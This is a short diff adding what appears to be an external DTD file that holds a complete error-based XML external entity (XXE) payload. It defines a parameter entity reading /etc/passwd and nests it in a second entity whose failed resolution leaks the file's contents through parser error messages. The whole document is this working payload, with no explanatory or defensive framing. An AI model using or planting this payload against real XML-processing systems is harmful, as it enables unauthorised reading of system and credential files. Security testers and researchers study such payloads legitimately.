@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % prepare "<!ENTITY &#x25; err SYSTEM '%data;'>">
+%prepare;
+%err;
